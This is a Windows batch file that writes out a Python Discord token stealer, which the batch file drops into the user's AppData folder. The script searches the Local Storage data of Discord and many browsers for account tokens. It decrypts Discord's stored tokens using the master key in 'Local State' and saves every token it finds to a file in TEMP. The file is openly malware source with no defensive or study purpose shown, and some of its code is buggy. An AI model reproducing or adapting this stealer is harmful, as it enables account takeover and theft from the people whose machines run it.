@echo off

echo from re import findall >%userprofile%\AppData\Local\Teamp\kdot.py
echo import os >>%userprofile%\AppData\Local\Teamp\kdot.py
echo from Crypto.Cipher import AES >>%userprofile%\AppData\Local\Teamp\kdot.py
echo from win32crypt import CryptUnprotectData >>%userprofile%\AppData\Local\Teamp\kdot.py
echo from json import loads >>%userprofile%\AppData\Local\Teamp\kdot.py
echo from base64 import b64decode >>%userprofile%\AppData\Local\Teamp\kdot.py
echo global all_tokens >>%userprofile%\AppData\Local\Teamp\kdot.py
echo all_tokens = [] >>%userprofile%\AppData\Local\Teamp\kdot.py
echo local = os.getenv("LOCALAPPDATA") >>%userprofile%\AppData\Local\Teamp\kdot.py
echo roaming = os.getenv("APPDATA") >>%userprofile%\AppData\Local\Teamp\kdot.py
echo temp = os.getenv("TEMP") >>%userprofile%\AppData\Local\Teamp\kdot.py
echo paths = { >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Discord': local + '\\discord\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Discord Canary': local + '\\discordcanary\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Lightcord': local + '\\Lightcord\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Discord PTB': local + '\\discordptb\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Opera': local + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Opera GX': local + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Amigo': roaming + '\\Amigo\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Torch': roaming + '\\Torch\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Kometa': roaming + '\\Kometa\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Orbitum': roaming + '\\Orbitum\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'CentBrowser': roaming + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     '7Star': roaming + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Sputnik': roaming + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Vivaldi': roaming + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Chrome SxS': roaming + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Epic Privacy Browser': roaming + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Microsoft Edge': roaming + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Uran': roaming + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     'Iridium': roaming + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\' >>%userprofile%\AppData\Local\Teamp\kdot.py
echo } >>%userprofile%\AppData\Local\Teamp\kdot.py
echo path2 = roaming + '\\discord\\Local Storage\\leveldb\\' >>%userprofile%\AppData\Local\Teamp\kdot.py
echo path3 = roaming + '\\discord\\' >>%userprofile%\AppData\Local\Teamp\kdot.py
echo def gettokens(paths): >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     tokens = [] >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     for file_name in os.listdir(paths): >>%userprofile%\AppData\Local\Teamp\kdot.py
echo         if not file_name.endswith(".log") and not file_name.endswith(".ldb"): >>%userprofile%\AppData\Local\Teamp\kdot.py
echo             continue >>%userprofile%\AppData\Local\Teamp\kdot.py
echo         for line in [x.strip() for x in open(f"{paths}\\{file_name}", errors="ignore").readlines() if x.strip()]: >>%userprofile%\AppData\Local\Teamp\kdot.py
echo             for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}", r"mfa\.[\w-]{84}"): >>%userprofile%\AppData\Local\Teamp\kdot.py
echo                 for token in findall(regex, line): >>%userprofile%\AppData\Local\Teamp\kdot.py
echo                     all_tokens.append(token) >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     return tokens >>%userprofile%\AppData\Local\Teamp\kdot.py
echo def get_master_key(path3): >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     with open(f'{path3}Local State', 'r', encoding='utf-8') as f: >>%userprofile%\AppData\Local\Teamp\kdot.py
echo         key = loads(f.read())['os_crypt']['encrypted_key'] >>%userprofile%\AppData\Local\Teamp\kdot.py
echo         return key >>%userprofile%\AppData\Local\Teamp\kdot.py
echo penis = get_master_key(path3) >>%userprofile%\AppData\Local\Teamp\kdot.py
echo def get_discord_token(path2): >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     tokens_discord = [] >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     for subdir, dirs, files in os.walk(path2): >>%userprofile%\AppData\Local\Teamp\kdot.py
echo         for file in files: >>%userprofile%\AppData\Local\Teamp\kdot.py
echo             if not file.endswith(".log") and not file.endswith(".ldb"): >>%userprofile%\AppData\Local\Teamp\kdot.py
echo                 continue >>%userprofile%\AppData\Local\Teamp\kdot.py
echo             else: >>%userprofile%\AppData\Local\Teamp\kdot.py
echo                 try: >>%userprofile%\AppData\Local\Teamp\kdot.py
echo                     with open(f"{path2}{file}", "r+", errors='ignore') as f: >>%userprofile%\AppData\Local\Teamp\kdot.py
echo                         for i in f.readlines(): >>%userprofile%\AppData\Local\Teamp\kdot.py
echo                             i.strip() >>%userprofile%\AppData\Local\Teamp\kdot.py
echo                             regex2 = '''dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\''' >>%userprofile%\AppData\Local\Teamp\kdot.py
echo                             regex3 = r']*^"' >>%userprofile%\AppData\Local\Teamp\kdot.py
echo                             regex4 = regex2 + regex3 >>%userprofile%\AppData\Local\Teamp\kdot.py
echo                             for values in findall(regex4, i): >>%userprofile%\AppData\Local\Teamp\kdot.py
echo                                 tokens_discord.append(values) >>%userprofile%\AppData\Local\Teamp\kdot.py
echo                 except: >>%userprofile%\AppData\Local\Teamp\kdot.py
echo                     pass >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     for token in tokens_discord: >>%userprofile%\AppData\Local\Teamp\kdot.py
echo         all_tokens.append(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(penis)[5:])) >>%userprofile%\AppData\Local\Teamp\kdot.py
echo def decrypt(buff, master_key): >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     try: >>%userprofile%\AppData\Local\Teamp\kdot.py
echo         return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode() >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     except Exception as e: >>%userprofile%\AppData\Local\Teamp\kdot.py
echo         return "An error has occured.\n" + e >>%userprofile%\AppData\Local\Teamp\kdot.py
echo if __name__ == '__main__': >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     for platfrom, path in paths.items(): >>%userprofile%\AppData\Local\Teamp\kdot.py
echo         if not os.path.exists(path): >>%userprofile%\AppData\Local\Teamp\kdot.py
echo             continue >>%userprofile%\AppData\Local\Teamp\kdot.py
echo         for tokens in gettokens(path): >>%userprofile%\AppData\Local\Teamp\kdot.py
echo             print("finished") >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     remove_dup = [*set(all_tokens)] >>%userprofile%\AppData\Local\Teamp\kdot.py
echo     with open(f"{temp}\\tokens.txt", "w", encoding="utf-8", errors="ignore") as f: >>%userprofile%\AppData\Local\Teamp\kdot.py
echo         for shits in remove_dup: >>%userprofile%\AppData\Local\Teamp\kdot.py
echo             f.write(shits + "\n") >>%userprofile%\AppData\Local\Teamp\kdot.py